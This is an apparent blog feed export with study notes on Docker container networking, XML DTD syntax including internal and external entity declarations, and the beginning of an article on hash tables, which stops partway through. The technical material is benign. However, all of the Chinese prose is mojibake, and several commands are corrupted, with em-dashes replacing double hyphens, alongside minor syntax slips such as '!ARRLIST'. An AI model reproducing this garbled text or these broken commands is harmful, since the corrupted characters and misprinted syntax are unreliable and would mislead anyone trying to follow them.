<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P â€”name <span class="string">&quot;tomcat02&quot;</span> â€”<span class="built_in">link</span> tomcat01 tomcat</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker exec-it tomcat02 ping tomcat01  //ok</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker exec-it tomcat01 ping tomcat02 //no</span><br></pre></td></tr></table></figure>

<p>å¦‚æœéœ€è¦tomcat01èƒ½å¤Ÿé€šè¿‡æœåŠ¡åpingé€štomcat02 éœ€è¦ä¸ºtomcat01ä¹Ÿè®¾ç½®â€”link</p>
<p>æœ¬è´¨æ˜¯åœ¨&#x2F;etc&#x2F;hosts æ–‡ä»¶ä¸­é…ç½®äº†æ˜ å°„</p>
<p>å¯ä»¥çœ‹å‡ºdocker0ä¸æ”¯æŒé€šè¿‡å®¹å™¨åæ¥å®ç°å®¹å™¨é—´çš„é€šä¿¡</p>
<p>æ–°æ‰‹å…¥é—¨çº§ï¼Œç°å·²ä¸æ¨èä½¿ç”¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network inspect  å®¹å™¨<span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network <span class="built_in">ls</span> //åˆ—å‡ºæ‰€æœ‰ç½‘ç»œ</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network <span class="built_in">rm</span> //åˆ é™¤ä¸€ä¸ªç½‘ç»œ</span><br></pre></td></tr></table></figure>

<h2 id="è‡ªå®šä¹‰ç½‘ç»œ"><a href="#è‡ªå®šä¹‰ç½‘ç»œ" class="headerlink" title="è‡ªå®šä¹‰ç½‘ç»œ"></a>è‡ªå®šä¹‰ç½‘ç»œ</h2><p>dockerç½‘ç»œæ¨¡å¼</p>
<p>bridge &#x2F;&#x2F;æ¡¥æ¥</p>
<p>none &#x2F;&#x2F;ä¸é…ç½®ç½‘ç»œ</p>
<p>host &#x2F;&#x2F;å’Œå®¿ä¸»æœºå…±äº«ç½‘ç»œ</p>
<p>container &#x2F;&#x2F;å®¹å™¨é—´ç½‘ç»œè”é€š</p>
<p>docker run -d â€”name â€œtomcatâ€ â€”net bridge tomcat  &#x2F;&#x2F;â€”net ä¸ºé»˜è®¤å‚æ•°ï¼Œä¸å†™ä¹Ÿä¼šè‡ªåŠ¨æ·»åŠ ã€</p>
<p><code>docker network create â€”driver bridge â€”subnet 192.168.0.0/16 â€”gateway 192.168.0.1 mynet(ç½‘ç»œå)  //è‡ªå®šä¹‰ä¸€ä¸ªç½‘ç»œ</code></p>
<p>ä½¿ç”¨è‡ªå®šä¹‰ç½‘ç»œå¯åŠ¨å®¹å™¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P  â€”name <span class="string">&quot;container_mynet_01&quot;</span> â€”net mynet tomcat</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P  â€”name <span class="string">&quot;container_mynet_02&quot;</span> â€”net mynet tomcat</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è¯¥æ–¹æ³•è¿è¡Œçš„å®¹å™¨ï¼Œå¯ä»¥é€šè¿‡å®¹å™¨åä¼šäº’ç›¸pingé€š</p>
<p>åŒæ—¶å¯ä¸ºä¸åŒçš„é›†ç¾¤åˆ›å»ºä¸åŒçš„ç½‘ç»œï¼Œä»è€Œä¿è¯äº†ç½‘ç»œçš„å¥åº·ï¼Œæå‡äº†ç½‘ç»œçš„å®‰å…¨æ€§</p>
<h2 id="ç½‘ç»œè¿é€š"><a href="#ç½‘ç»œè¿é€š" class="headerlink" title="ç½‘ç»œè¿é€š"></a>ç½‘ç»œè¿é€š</h2><p>è¿æ¥ä¸åŒçš„ç½‘ç»œï¼Œä¸æ˜¯ç›´æ¥æ‰“é€šä¸åŒçš„ç½‘ç»œï¼Œè€Œæ˜¯å°†ä¸åŒç½‘ç»œçš„å®¹å™¨åŒç½‘ç»œè”é€š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network connect  ç½‘ç»œå å®¹å™¨å //å°†å®¹å™¨è¿æ¥åˆ°ç½‘ç»œä¸Šï¼Œå®è´¨æ˜¯å°†å®¹å™¨ç›´æ¥æ”¾åˆ°ç½‘ç»œä¸‹é¢ï¼Œç›¸å½“äºä¸€ä¸ªå®¹å™¨æ‹¥æœ‰äº†ä¸¤ä¸ªIP</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>å®¹å™¨</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>å®¹å™¨</tag>
      </tags>
  </entry>
  <entry>
    <title>DTD-æ–‡æ¡£ç±»å‹å®šä¹‰</title>
    <url>/archives/67b9bed.html</url>
    <content><![CDATA[<h1 id="DTD-æ–‡æ¡£ç±»å‹å®šä¹‰"><a href="#DTD-æ–‡æ¡£ç±»å‹å®šä¹‰" class="headerlink" title="DTD-æ–‡æ¡£ç±»å‹å®šä¹‰"></a>DTD-æ–‡æ¡£ç±»å‹å®šä¹‰</h1><p>ç”¨æ¥å®šä¹‰åˆæ³•çš„xmlæ–‡æ¡£æ„å»ºæ¨¡å—ï¼Œä½¿ç”¨ä¸€äº›åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£ç»“æ„ï¼Œå¯è¢«ç”¨æ¥æ£€æµ‹xmlæ–‡æ¡£è¯­æ³•æ˜¯å¦æ­£ç¡®ã€‚DTDå¯ä»¥è¢«æˆè¡Œåœ°å£°æ˜äºxmlæ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä»¥æˆä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚</p>
<h2 id="å†…éƒ¨æ–‡æ¡£å£°æ˜"><a href="#å†…éƒ¨æ–‡æ¡£å£°æ˜" class="headerlink" title="å†…éƒ¨æ–‡æ¡£å£°æ˜"></a>å†…éƒ¨æ–‡æ¡£å£°æ˜</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</span></span><br><span class="line">e.g.</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">to</span>&gt;</span>armandhe<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">from</span>&gt;</span>hjx<span class="tag">&lt;<span class="name">from</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">heading</span>&gt;</span>message<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span>hello,world<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="test.xml">test.xml</a></p>
<h2 id="å¤–éƒ¨æ–‡æ¡£å£°æ˜"><a href="#å¤–éƒ¨æ–‡æ¡£å£°æ˜" class="headerlink" title="å¤–éƒ¨æ–‡æ¡£å£°æ˜"></a>å¤–éƒ¨æ–‡æ¡£å£°æ˜</h2><p><strong>xmlæ–‡æ¡£éƒ¨åˆ†</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;note.dtd&#x27;</span>&gt;</span> //å®šä¹‰å¤–éƒ¨æ–‡æ¡£å£°æ˜</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">to</span>&gt;</span>armandhe<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">from</span>&gt;</span>hjx<span class="tag">&lt;<span class="name">from</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">heading</span>&gt;</span>message<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span>hello,world<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>dtdæ–‡æ¡£éƒ¨åˆ†</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="XMLæ–‡æ¡£æ„å»ºæ¨¡å—"><a href="#XMLæ–‡æ¡£æ„å»ºæ¨¡å—" class="headerlink" title="XMLæ–‡æ¡£æ„å»ºæ¨¡å—"></a>XMLæ–‡æ¡£æ„å»ºæ¨¡å—</h2><p>æ‰€æœ‰åœ°xmlæ–‡æ¡£å‡ç”±ä¸€ä¸‹åœ°æ„å»ºæ¨¡å—æ„æˆï¼š</p>
<ul>
<li>å…ƒç´ </li>
<li>å±æ€§</li>
<li>å®ä½“</li>
<li>PCDATA</li>
<li>CDDATA</li>
</ul>
<h3 id="å…ƒç´ "><a href="#å…ƒç´ " class="headerlink" title="å…ƒç´ "></a>å…ƒç´ </h3><p>å…ƒç´ æ˜¯ XML ä»¥åŠ HTML æ–‡æ¡£çš„<em><strong>ä¸»è¦æ„å»ºæ¨¡å—</strong></em>ã€‚</p>
<p>HTML å…ƒç´ çš„ä¾‹å­æ˜¯ â€œbodyâ€ å’Œ â€œtableâ€ã€‚XML å…ƒç´ çš„ä¾‹å­æ˜¯ â€œnoteâ€ å’Œ â€œmessageâ€ ã€‚å…ƒç´ å¯åŒ…å«æ–‡æœ¬ã€å…¶ä»–å…ƒç´ æˆ–è€…æ˜¯ç©ºçš„ã€‚ç©ºçš„ HTML å…ƒç´ çš„ä¾‹å­æ˜¯ â€œhrâ€ã€â€brâ€ ä»¥åŠ â€œimgâ€ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">	çˆ¶å…ƒç´ æ–‡æœ¬</span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span>&gt;</span>å­å…ƒç´ æ–‡æœ¬å†…å®¹<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>    //bodyä¸formå‡ä¸ºå…ƒç´ </span><br></pre></td></tr></table></figure>

<h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p>å±æ€§å¯æä¾›æœ‰å…³å…ƒç´ çš„é¢å¤–ä¿¡æ¯ã€‚æ€§æ€»æ˜¯è¢«ç½®äºæŸå…ƒç´ çš„å¼€å§‹æ ‡ç­¾ä¸­ã€‚å±æ€§æ€»æ˜¯ä»¥åç§°&#x2F;å€¼çš„å½¢å¼æˆå¯¹å‡ºç°çš„ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;computer.gif&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="å®ä½“"><a href="#å®ä½“" class="headerlink" title="å®ä½“"></a>å®ä½“</h3><p>å®ä½“æ˜¯ç”¨æ¥å®šä¹‰æ™®é€šæ–‡æœ¬çš„å˜é‡ã€‚å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">ç±»ä¼¼äºhtmlå®ä½“ï¼Œhtmlå®ä½“åœ¨xmlä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œå·²ç»è¢«é¢„å®šä¹‰äº†</span><br></pre></td></tr></table></figure>

<h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA çš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ï¼ˆparsed character dataï¼‰ã€‚</p>
<p>å¯æŠŠå­—ç¬¦æ•°æ®æƒ³è±¡ä¸º XML å…ƒç´ çš„å¼€å§‹æ ‡ç­¾ä¸ç»“æŸæ ‡ç­¾ä¹‹é—´çš„æ–‡æœ¬ã€‚</p>
<p><strong>PCDATA æ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚</strong></p>
<p>æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚</p>
<p>ä¸è¿‡ï¼Œè¢«è§£æçš„å­—ç¬¦æ•°æ®ä¸åº”å½“åŒ…å«ä»»ä½• &amp;ã€&lt; æˆ–è€… &gt; å­—ç¬¦ï¼›éœ€è¦ä½¿ç”¨ &amp;ã€&lt; ä»¥åŠ &gt; å®ä½“æ¥åˆ†åˆ«æ›¿æ¢å®ƒä»¬ã€‚</p>
<p><code>ä¹Ÿå°±æ˜¯è¯´ï¼ŒæŸä¸€ä¸ªå…ƒç´ è¢«å®šä¹‰ä¸ºPCDATAï¼Œé‚£ä¹ˆä»–å†…éƒ¨åœ°æ–‡æœ¬å…ƒç´ ä¸­åœ°å†…å®¹å¦‚æœå‡ºç°å…¶ä»–æ ‡è®°ï¼Œé‚£ä¹ˆè¿™äº›æ ‡è®°å°†è¢«è§£æä¸ºå…ƒç´ ,å¦‚æœè¦è®©xmlä¸­ä½¿ç”¨åœ°ç‰¹æ®Šå­—ç¬¦è¢«åŸæ ·æ˜¾ç¤ºï¼Œåˆ™éœ€è¦ä½¿ç”¨å¯¹åº”åœ°å®ä½“ã€‚</code> </p>
<h3 id="CDDATA"><a href="#CDDATA" class="headerlink" title="CDDATA"></a>CDDATA</h3><p>CDATA çš„æ„æ€æ˜¯å­—ç¬¦æ•°æ®ï¼ˆcharacter dataï¼‰ã€‚</p>
<p>***CDATA æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚***åœ¨è¿™äº›æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¸ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¯¹å¾…ï¼Œå…¶ä¸­çš„å®ä½“ä¹Ÿä¸ä¼šè¢«å±•å¼€ã€‚</p>
<p><code>é€šä¿—å¾—è®²å°±æ˜¯åŸæ ·è¾“å‡º</code> </p>
<h2 id="å…ƒç´ å£°æ˜"><a href="#å…ƒç´ å£°æ˜" class="headerlink" title="å…ƒç´ å£°æ˜"></a>å…ƒç´ å£°æ˜</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> <span class="keyword">EMPTY</span>&gt;</span> //<span class="tag">&lt;<span class="name">note</span> /&gt;</span> ç©ºå…ƒç´ </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">#PCDATA</span>)&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> <span class="keyword">ANY</span>&gt;</span>  //å¯åŒ…å«ä»»æ„å†…å®¹</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  //å­—å…ƒç´ å¿…é¡»æŒ‰ç« åˆ—å‡ºé¡ºåºå‡ºç°åœ¨å…ƒç´ ä¸­ä¸”ï¼Œå­—å…ƒç´ ä¹Ÿéœ€è¢«å£°æ˜</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">footer</span>)&gt;</span> //å£°æ˜åªå‡ºç°ä¸€æ¬¡çš„å…ƒç´ </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">footer</span>+)&gt;</span> //å­å…ƒç´ è‡³å°‘å‡ºç°ä¸€æ¬¡</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">footer</span>*)&gt;</span> //å­—å…ƒç´ å‡ºç°ä¸€æ¬¡æˆ–å¤šæ¬¡</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">footer</span>?)&gt;</span> //å­—å…ƒç´ å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">head</span>,<span class="keyword">body</span>,(<span class="keyword">message</span>|<span class="keyword">confirm</span>))&gt;</span> //æ‹¬å·æ€»çš„å…ƒç´ æœ‰ä¸”åªèƒ½å‡ºç°ä¸€ä¸ª</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">#PCDATA</span>|<span class="keyword">to</span>|<span class="keyword">form</span>)*&gt;</span> //å¯ä»¥å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡çš„.....</span><br></pre></td></tr></table></figure>

<h2 id="å±æ€§å£°æ˜"><a href="#å±æ€§å£°æ˜" class="headerlink" title="å±æ€§å£°æ˜"></a>å±æ€§å£°æ˜</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ARRLIST å…ƒç´ åç§° å±æ€§åç§° å±æ€§ç±»å‹ é»˜è®¤å€¼&gt;</span></span><br><span class="line">e.g</span><br><span class="line"><span class="meta">&lt;!AttlIST <span class="keyword">note</span> <span class="keyword">id</span> <span class="keyword">CDATA</span> 1&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="%E5%B1%9E%E6%80%A7%E7%B1%BB%E5%9E%8B%20aafed6de37df4ebd919995b3af4d41d4.csv">å±æ€§ç±»å‹</a></p>
<p><a href="%E5%B1%9E%E6%80%A7%E9%BB%98%E8%AE%A4%E5%80%BC%2028f7fb5827924cfc84ea39b0a288be63.csv">å±æ€§é»˜è®¤å€¼</a></p>
<h2 id="å®ä½“-1"><a href="#å®ä½“-1" class="headerlink" title="å®ä½“"></a>å®ä½“</h2><p>å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚</p>
<p>å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</p>
<p>å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">//å†…éƒ¨å®ä½“</span><br><span class="line"><span class="meta">&lt;!ENTITY å®ä½“åç§° â€œå®ä½“å€¼â€&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">message</span> <span class="string">&quot;this is a part of a good book&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">des</span>&gt;</span><span class="symbol">&amp;message;</span><span class="tag">&lt;/<span class="name">des</span>&gt;</span> </span><br><span class="line">//å¤–éƒ¨å®ä½“</span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">message</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.armandhe.com/a.dtd&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">des</span>&gt;</span><span class="symbol">&amp;message;</span><span class="tag">&lt;/<span class="name">des</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>åè®®è§„èŒƒ</category>
      </categories>
      <tags>
        <tag>DTD</tag>
        <tag>XML</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>HASHè¡¨ä¸ä¸€è‡´æ€§HASH</title>
    <url>/archives/810d7b26.html</url>
    <content><![CDATA[<h1 id="HASHè¡¨ä¸ä¸€è‡´æ€§HASH"><a href="#HASHè¡¨ä¸ä¸€è‡´æ€§HASH" class="headerlink" title="HASHè¡¨ä¸ä¸€è‡´æ€§HASH"></a>HASHè¡¨ä¸ä¸€è‡´æ€§HASH</h1><h1 id="å“ˆå¸Œè¡¨çš„åŸºæœ¬è®¤è¯†"><a href="#å“ˆå¸Œè¡¨çš„åŸºæœ¬è®¤è¯†" class="headerlink" title="å“ˆå¸Œè¡¨çš„åŸºæœ¬è®¤è¯†"></a>å“ˆå¸Œè¡¨çš„åŸºæœ¬è®¤è¯†</h1><hr>
<p>å“ˆå¸Œè¡¨ä¹Ÿå«åšæ•£åˆ—è¡¨ï¼Œæ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œä»–æä¾›äº†å¿«é€Ÿçš„æŸ¥è¯¢ä»¥åŠæŸ¥è¯¢æ“ä½œï¼Œæ— è®ºå“ˆå¸Œè¡¨ä¸­æœ‰å¤šå°‘æ¡æ•°æ®ï¼Œä»–çš„æŸ¥æ‰¾çš„æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯O(1)</p>
<p>å“ˆå¸Œè¡¨æ˜¯åŸºäºæ•°ç»„åŸç†çš„ï¼Œæ‰€ä»¥å¯¼è‡´å…¶æ‰©å®¹æµ‹æˆæœ¬éå¸¸çš„é«˜ï¼Œå½“å“ˆå¸Œè¡¨è¢«å¡«æ»¡çš„æ—¶å€™ï¼Œæ€§èƒ½ä¸‹é™éå¸¸ä¸¥é‡</p>
<p>å“ˆå¸Œè¡¨è¿ç”¨çš„å°±æ˜¯ä¸€ç§è½¬æ¢çš„æ€æƒ³ï¼Œå°†æŸ¥è¯¢çš„é”®è½¬æ¢ä¸ºæ•°ç»„çš„ä¸‹æ ‡ï¼Œåœ¨å“ˆå¸Œè¡¨ä¸­è¿™ä¸ªè¿‡ç¨‹é€šè¿‡å“ˆå¸Œå‡½æ•°æ¥å®Œæˆã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­:</p>
<p><code>æˆ‘ä»¬ä¸Šå­¦çš„æ—¶å€™ï¼Œå¤§å®¶éƒ½ä¼šæœ‰ä¸€ä¸ªå­¦å·ã€Œ1-nå·ã€ä¸­çš„ä¸€ä¸ªå·ç ï¼Œå¦‚æœæˆ‘ä»¬ç”¨å“ˆå¸Œè¡¨æ¥å­˜æ”¾ç­çº§é‡Œé¢å­¦ç”Ÿä¿¡æ¯çš„è¯ï¼Œæˆ‘ä»¬åˆ©ç”¨å­¦å·ä½œä¸ºã€Œé”®ã€æˆ–è€…ã€Œå…³é”®å­—ã€ï¼Œè¿™ä¸ªã€Œé”®ã€æˆ–è€…ã€Œå…³é”®å­—ã€å°±å¯ä»¥ç›´æ¥ä½œä¸ºæ•°æ®çš„ä¸‹æ ‡ï¼Œä¸éœ€è¦é€šè¿‡å“ˆå¸Œå‡½æ•°è¿›è¡Œè½¬åŒ–ã€‚å¦‚æœæˆ‘ä»¬éœ€è¦å®‰è£…å­¦ç”Ÿå§“åä½œä¸ºã€Œé”®ã€æˆ–è€…ã€Œå…³é”®å­—ã€ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦å“ˆå¸Œå‡½æ•°æ¥å¸®æˆ‘ä»¬è½¬æ¢æˆæ•°ç»„çš„ä¸‹æ ‡ã€‚</code></p>
<h1 id="å“ˆå¸Œå‡½æ•°"><a href="#å“ˆå¸Œå‡½æ•°" class="headerlink" title="å“ˆå¸Œå‡½æ•°"></a>å“ˆå¸Œå‡½æ•°</h1><hr>
<p>å“ˆå¸Œå‡½æ•°çš„ä½œç”¨å°±æ˜¯å¸®æˆ‘ä»¬æŠŠéæ•´å‹çš„æ•°æ®è½¬æ¢ä¸ºæ•´å‹æ¥å……å½“æ•°ç»„çš„ä¸‹æ ‡</p>
<p><img src="/archives/810d7b26/Untitled.png"></p>
<p>å“ˆå¸Œå‡½æ•°è¦æ»¡è¶³å¦‚ä¸‹åŸåˆ™ï¼š</p>
<ol>
<li>å“ˆå¸Œå‡½æ•°ç”Ÿæˆçš„å€¼ä¸èƒ½ä¸ºè´Ÿæ•°</li>
<li>åŒä¸€ä¸ªé”®ç»è¿‡å“ˆå¸Œå‡½æ•°è¿ç®—åå¾—åˆ°çš„ä¸‹æ ‡å¿…é¡»æ˜¯ä¸€è‡´çš„</li>
</ol>
<p>é€šè¿‡ä¸Šé¢ä½ çš„æè¿°å¯ä»¥çœ‹å‡ºï¼Œå“ˆå¸Œå‡½æ•°ç”Ÿæˆçš„ä¸‹æ ‡æ˜¯å¯èƒ½å­˜åœ¨é‡å¤çš„ï¼Œå¦‚student ä½•student1ä¸¤ä¸ªé”®ç”Ÿæˆçš„ä¸‹æ ‡å¯èƒ½ç›¸ç­‰åŒä¸º1ï¼Œé‚£ä¹ˆè¿™æ—¶é€šè¿‡å“ˆå¸Œè¡¨æŸ¥è¯¢çš„æ•°æ®å°±æ˜¯ä¸å‡†ç¡®çš„ï¼Œæˆ‘ä»¬æŠŠå·¨å¤§çš„ç©ºé—´è½¬æ¢ä¸ºè¾ƒå°çš„æ•°ç»„ç©ºé—´çš„æ—¶å€™ï¼Œä¸å¯é¿å…åœ°ä¼šå‡ºç°é‡å¤åœ°ç°è±¡ï¼Œè¿™ä¸ªç°è±¡å°±å«åš<code>å“ˆå¸Œå†²çª</code>ã€‚å“ˆå¸Œå†²çªæ˜¯ä¸å¯é¿å…åœ°ï¼Œæˆ‘ä»¬é€šè¿‡<code>å¼€æ”¾åœ°å€æ³•</code>ä¸<code>é“¾è¡¨æ³•</code>æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<h1 id="å“ˆå¸Œå†²çªçš„è§£å†³"><a href="#å“ˆå¸Œå†²çªçš„è§£å†³" class="headerlink" title="å“ˆå¸Œå†²çªçš„è§£å†³"></a>å“ˆå¸Œå†²çªçš„è§£å†³</h1><hr>
<h2 id="å¼€æ”¾åœ°å€æ³•"><a href="#å¼€æ”¾åœ°å€æ³•" class="headerlink" title="å¼€æ”¾åœ°å€æ³•"></a>å¼€æ”¾åœ°å€æ³•</h2><hr>
<h3 id="çº¿æ€§æ¢æµ‹"><a href="#çº¿æ€§æ¢æµ‹" class="headerlink" title="çº¿æ€§æ¢æµ‹"></a>çº¿æ€§æ¢æµ‹</h3><hr>
<p><strong>çº¿æ€§æ¢æµ‹çš„æ’å…¥</strong></p>
<p>ä¸€ä¸ªé”®ç»è¿‡å“ˆå¸Œè¿ç®—åï¼Œå‡†å¤‡å°†å…¶å¯¹åº”çš„æ•°æ®æ’å…¥åˆ°è®¡ç®—å‡ºæ¥çš„ä¸‹æ ‡å¯¹åº”çš„æ•°ç»„çš„ä½ç½®æ—¶ï¼Œå‘ç°è¯¥ä½ç½®å·²ç»æœ‰å€¼äº†ï¼Œæ­¤æ—¶ä¼šæŒ‰ç…§é¡ºåºä¾æ¬¡å‘ä¸‹æ¢æµ‹ä¸‹ä¸€ä¸ªä¸‹æ ‡ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªç©ºçš„ä½ç½®ä¸ºæ­¢</p>
<p><strong>çº¿æ€§æ¢æµ‹çš„æŸ¥æ‰¾</strong></p>
